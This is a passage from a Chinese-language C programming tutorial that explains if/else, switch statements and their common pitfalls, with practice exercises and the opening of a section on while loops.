<li>else不能脱离if单独使用</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式)&#123;</span><br><span class="line">  语句块<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  语句块<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">后续语句;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(age &gt; <span class="number">18</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;开网卡\n&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;喊家长来开\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;买烟\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>if第三种形式<ul>
<li>如果”表达式1”为真,则执行”语句块1”,否则判断”表达式2”,如果为真执行”语句块2”,否则再判断”表达式3”,如果真执行”语句块3”, 当表达式1、2、3都不满足,会执行最后一个else语句</li>
<li>众多大括号中,只有一个大括号中的内容会被执行</li>
<li>只有前面所有添加都不满足, 才会执行else大括号中的内容</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>) &#123;</span><br><span class="line">  语句块<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">2</span>)&#123;</span><br><span class="line">  语句块<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(表达式<span class="number">3</span>)&#123;</span><br><span class="line">  语句块<span class="number">3</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  语句块<span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">后续语句;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(age&gt;<span class="number">40</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;给房卡&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(age&gt;<span class="number">25</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;给名片&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(age&gt;<span class="number">18</span>)&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;给网卡&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;给好人卡&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;买烟\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>if嵌套<ul>
<li>if中可以继续嵌套if, else中也可以继续嵌套if</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line">    语句块<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span>(表达式<span class="number">2</span>)&#123;</span><br><span class="line">      语句块<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(表达式<span class="number">3</span>)&#123;</span><br><span class="line">      语句块<span class="number">3</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      语句块<span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>if注意点</strong><ul>
<li>任何数值都有真假性</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    if(0)&#123;</span><br><span class="line">        printf(&quot;执行了if&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;执行了else&quot;); // 被执行</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当if else后面只有一条语句时, if else后面的大括号可以省略</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 极其不推荐写法</span></span><br><span class="line"><span class="keyword">int</span> age = <span class="number">17</span>;</span><br><span class="line"><span class="keyword">if</span> (age &gt;= <span class="number">18</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;开网卡\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;喊家长来开\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当if else后面的大括号被省略时, else会自动和距离最近的一个if匹配</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// 和if(1)匹配</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// 和if(0)匹配, 因为if(1)已经被匹配过了</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C\n&quot;</span>); <span class="comment">// 输出C</span></span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// 和if(1)匹配</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;D\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>如果if else省略了大括号, 那么后面不能定义变量</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">int</span> number = <span class="number">10</span>; <span class="comment">// 系统会报错</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number = %i\n&quot;</span>, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> number = <span class="number">10</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">int</span> value = <span class="number">20</span>; <span class="comment">// 系统会报错</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value = %i\n&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>C语言中分号(;)也是一条语句, 称之为空语句</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 因为if(10 &gt; 2)后面有一个分号, 所以系统会认为if省略了大括号</span></span><br><span class="line"><span class="comment">// if省略大括号时只能管控紧随其后的那条语句, 所以只能管控分号</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">10</span> &gt; <span class="number">2</span>);</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;10 &gt; 2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果: 10 &gt; 2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>但凡遇到比较一个变量等于或者不等于某一个常量的时候，把常量写在前面</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">8</span>;</span><br><span class="line"><span class="comment">//    if(a = 10)&#123;// 错误写法, 但不会报错</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">10</span> == a)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;a的值是10\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;a的值不是10\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>if练习<ul>
<li>从键盘输入一个整数，判断其是否是偶数，如果是偶数就输出YES，否则输出NO；</li>
<li>接收用户输入的1～7的整数，根据用户输入的整数，输出对应的星期几</li>
<li>接收用户输入的一个整数month代表月份，根据月份输出对应的季节</li>
<li>接收用户输入的两个整数，判断大小后输出较大的那个数</li>
<li>接收用户输入的三个整数，判断大小后输出较大的那个数</li>
<li>接收用户输入的三个整数，排序后输出</li>
</ul>
</li>
<li>实现石头剪刀布</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">剪刀石头布游戏:</span><br><span class="line"><span class="number">1</span>)定义游戏规则</span><br><span class="line">  剪刀 干掉 布</span><br><span class="line">  石头 干掉 剪刀</span><br><span class="line">  布 干掉石头</span><br><span class="line"><span class="number">2</span>)显示玩家开始猜拳</span><br><span class="line"><span class="number">3</span>)接收玩家输入的内容</span><br><span class="line"><span class="number">4</span>)让电脑随机产生一种拳</span><br><span class="line"><span class="number">5</span>)判断比较</span><br><span class="line">(<span class="number">1</span>)玩家赢的情况(显示玩家赢了)</span><br><span class="line">(<span class="number">2</span>)电脑赢的情况(显示电脑赢了)</span><br><span class="line">(<span class="number">3</span>)平局(显示平局)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/15/C/672ff35609edd25e6aa45a8adf1a6225.png" alt="img"></p>
<p><img src="/2022/01/15/C/a44287edc332fab3fc13d7da196899a9.png" alt="img"></p>
<p><img src="/2022/01/15/C/cb273336e304bc40948bfacebbdf01ed.png" alt="img"></p>
<h2 id="选择结构switch"><a href="#选择结构switch" class="headerlink" title="选择结构switch"></a>选择结构switch</h2><ul>
<li>由于 if else if 还是不够简洁，所以switch 就应运而生了，他跟 if else if 互为补充关系。switch 提供了点的多路选择</li>
<li>格式:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式<span class="number">1</span>:</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式<span class="number">2</span>:</span><br><span class="line">        语句<span class="number">2</span>; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式n:</span><br><span class="line">        语句n;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        语句n+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>语义:<ul>
<li>计算”表达式”的值, 逐个与其后的”常量表达式”值相比较,当”表达式”的值与某个”常量表达式”的值相等时, 即执行其后的语句, 然后跳出switch语句</li>
<li>如果”表达式”的值与所有case后的”常量表达式”均不相同时,则执行default后的语句</li>
</ul>
</li>
<li>示例:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期四\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期五\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期六\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期日\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>switch注意点<ul>
<li>switch条件表达式的类型必须是整型, 或者可以被提升为整型的值(char、short)</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">1.1</span>)&#123; <span class="comment">// 报错</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>+case的值只能是常量, 并且还必须是整型, 或者可以被提升为整型的值(char、short)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">1</span>)&#123; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> num: <span class="comment">// 报错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4.0</span>: <span class="comment">// 报错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期四\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>case后面常量表达式的值不能相同</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">1</span>)&#123; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// 报错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// 报错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>case后面要想定义变量,必须给case加上大括号</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;num = %i\n&quot;</span>, num);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>switch中只要任意一个case匹配, 其它所有的case和default都会失效. 所以如果case和default后面没有break就会出现穿透问题</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>); <span class="comment">// 被输出</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>); <span class="comment">// 被输出</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;回火星去\n&quot;</span>); <span class="comment">// 被输出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>switch中default可以省略</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>switch中default的位置不一定要写到最后, 无论放到哪都会等到所有case都不匹配才会执行(穿透问题除外)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Other,,,\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><em><strong>if和Switch转换</strong></em></li>
<li>看上去if和switch都可以实现同样的功能, 那么在企业开发中我们什么时候使用if, 什么时候使用switch呢?<ul>
<li>if else if 针对于范围的多路选择</li>
<li>switch 是针对点的多路选择</li>
</ul>
</li>
<li>判断用户输入的数据是否大于100</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">if</span>(a &gt; <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;用户输入的数据大于100&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;用户输入的数据不大于100&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="comment">// 挺(T)萌(M)的(D)搞不定啊</span></span><br><span class="line">    <span class="keyword">switch</span> (a) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">102</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">103</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">104</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">105</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;大于\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;不大于\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>练习<ul>
<li>实现分数等级判定</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">要求用户输入一个分数，根据输入的分数输出对应的等级</span><br><span class="line">A <span class="number">90</span>～<span class="number">100</span>  </span><br><span class="line">B <span class="number">80</span>～<span class="number">89</span></span><br><span class="line">C <span class="number">70</span>～<span class="number">79</span></span><br><span class="line">D <span class="number">60</span>～<span class="number">69</span></span><br><span class="line">E <span class="number">0</span>～<span class="number">59</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>实现+ - * / 简单计算器</li>
</ul>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><ul>
<li>C语言中提供了三大循环结构, 分别是while、dowhile和for</li>
<li>循环结构是程序中一种很重要的结构。<ul>
<li>其特点是,在给定条件成立时,反复执行某程序段, 直到条件不成立为止。</li>
<li>给定的条件称为”循环条件”,反复执行的程序段称为”循环体”<br><img src="/2022/01/15/C/d32037b3b82185eadb8c1f2ae4e2d160.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="循环结构while"><a href="#循环结构while" class="headerlink" title="循环结构while"></a>循环结构while</h2><ul>
<li><p>格式:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (  循环控制条件 ) &#123;</span><br><span class="line">    循环体中的语句;</span><br><span class="line">    能够让循环结束的语句;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>构成循环结构的几个条件<ul>
<li>循环控制条件<ul>
<li>循环退出的主要依据,来控制循环到底什么时候退出</li>
</ul>
</li>
<li>循环体<ul>
<li>循环的过程中重复执行的代码段</li>
</ul>
</li>
<li>能够让循环结束的语句(递增、递减、真、假等)<ul>
<li>能够让循环条件为假的依据,否则退出循环</li>
</ul>
</li>
</ul>
</li>
<li>示例:</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; <span class="comment">// 循环控制条件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); <span class="comment">// 需要反复执行的语句</span></span><br><span class="line">    count++; <span class="comment">// 能够让循环结束的语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>while循环执行流程<ul>
<li>首先会判定”循环控制条件”是否为真, 如果为假直接跳到循环语句后面</li>
<li>如果”循环控制条件”为真, 执行一次循环体, 然后再次判断”循环控制条件”是否为真, 为真继续执行循环体,为假跳出循环</li>
<li>重复以上操作, 直到”循环控制条件”为假为止</li>
</ul>
</li>
</ul>
